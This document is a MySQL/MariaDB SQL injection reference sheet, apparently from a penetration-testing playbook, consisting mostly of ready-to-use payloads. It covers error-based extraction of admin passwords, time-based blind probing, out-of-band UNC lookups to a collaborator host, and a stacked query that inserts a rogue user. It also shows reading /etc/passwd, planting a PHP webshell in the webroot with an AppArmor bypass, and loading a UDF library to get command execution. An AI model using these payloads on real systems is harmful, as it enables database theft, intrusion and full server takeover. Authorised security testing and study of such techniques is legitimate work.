# Per-DBMS Reference — MySQL / MariaDB

## When this applies

- DBMS fingerprint (response timing, error message, version banner) indicates MySQL/MariaDB.
- Quick fingerprint:
  ```sql
  ' UNION SELECT NULL#
  ' AND SLEEP(5)#
  SELECT @@version#
  ```

## Technique

MySQL has its own dialect: `#` and `-- ` (with trailing space) for comments, `LIMIT N,M` for pagination, `CONCAT()` and adjacent-string-literal concatenation, `SLEEP()` for timing. Stacked queries are usually disabled. OAST is Windows-only via UNC paths.

## Steps

### Comment syntax

```sql
#                           # MySQL inline comment (preferred)
-- (with trailing space)    # SQL standard, MySQL requires the space
/*...*/                     # Multi-line
```

### Concatenation

```sql
'foo' 'bar'                 # Adjacent literals → 'foobar'
CONCAT('foo','bar')         # Function form
```

### Version / current user

```sql
SELECT @@version
SELECT version()
SELECT user()
SELECT current_user
SELECT database()
```

### Schema enumeration

```sql
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### Time delay

```sql
SELECT SLEEP(10)
SELECT IF(1=1, SLEEP(10), 0)
SELECT BENCHMARK(10000000, SHA1('a'))   # CPU-bound alternative when SLEEP() blocked
```

### Error-based extraction

```sql
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1337)#
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e))#
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1)#
```

### Substring / length

```sql
SUBSTRING(s, p, l)
MID(s, p, l)
LENGTH(s)
```

### Out-of-band (Windows MySQL only)

```sql
LOAD_FILE('\\\\COLLABORATOR\\a')
SELECT ... INTO OUTFILE '\\\\COLLABORATOR\\a'
```

Linux MySQL has no built-in outbound primitive — fall back to time-based blind.

### Stacked queries

Disabled by default. Requires:
- `mysqli_multi_query` instead of `mysqli_query` (PHP)
- `multipleStatements: true` (Node `mysql2`)
- `MultipleStatements=true` (.NET connection string)

When supported:
```sql
1'; INSERT INTO users VALUES ('hacker','password123');#
```

### File operations

```sql
SELECT LOAD_FILE('/etc/passwd')                        -- requires FILE privilege
SELECT ... INTO OUTFILE '/var/www/html/shell.php'      -- requires FILE + secure_file_priv
SELECT '<?php system($_GET[0]);?>' INTO DUMPFILE '/var/www/html/shell.php'  -- AppArmor-bypass variant
```

`secure_file_priv` is set by default to a restricted dir on modern MySQL — check with `SHOW VARIABLES LIKE 'secure_file_priv';`.

**Debian/Ubuntu MariaDB AppArmor block — try `INTO DUMPFILE`.** The default `mariadb-server-3.0` AppArmor profile silently blocks `INTO OUTFILE` writes outside `/var/lib/mysql/` — query succeeds, no SQL error, but no file is created. `INTO DUMPFILE` (single-row raw write) often slips through because of how the profile parses the OUTFILE clause. Same SQLi, change one keyword. Useful for PHP webshells (single-line, no separators needed). From a blackbox SQLi position, just try `DUMPFILE` whenever `OUTFILE` silently no-ops on the webroot. From a foothold, confirm with `dmesg | grep apparmor` (DENIED entries on mariadb).

### UDF / user-defined functions (privesc to RCE)

If you have FILE privilege and the binary path matches:

```sql
SELECT 0x<hex_of_so> INTO DUMPFILE '/usr/lib/mysql/plugin/raptor.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'raptor.so';
SELECT sys_exec('id > /tmp/out');
```

Reference: SQLMap's `--os-shell` automates the UDF dance.

### Common variants / aliases

```sql
&&  ↔  AND
||  ↔  OR    (only when PIPES_AS_CONCAT is OFF; default in MySQL is OFF, ON in MariaDB)
XOR (boolean XOR for false-only branches)
```

## Verifying success

- `SELECT @@version` returns a string like `8.0.32-0ubuntu0.20.04.2` or `10.6.12-MariaDB`.
- `SLEEP(10)` reliably delays the response by ~10s.
- `LOAD_FILE('/etc/passwd')` returns content (privilege check).

## Common pitfalls

- `--` without trailing space is treated as the subtraction operator; always use `-- ` or `#`.
- `||` is string concat in MariaDB by default but boolean OR in stock MySQL — check the dialect first.
- `SLEEP()` inside `WHERE` may be optimized away — wrap in `IF()` or `CASE WHEN`.
- `secure_file_priv` blocks `INTO OUTFILE` even with FILE privilege — read the variable, don't assume.
- Stacked queries silently fail (no error, second statement just ignored) when not enabled.

## Tools

- `mysql` CLI for sandbox testing of crafted queries before delivering.
- sqlmap `--dbms=MySQL` to focus payload generation.
- `mysqldump` for full schema if you escalate to DB credentials.
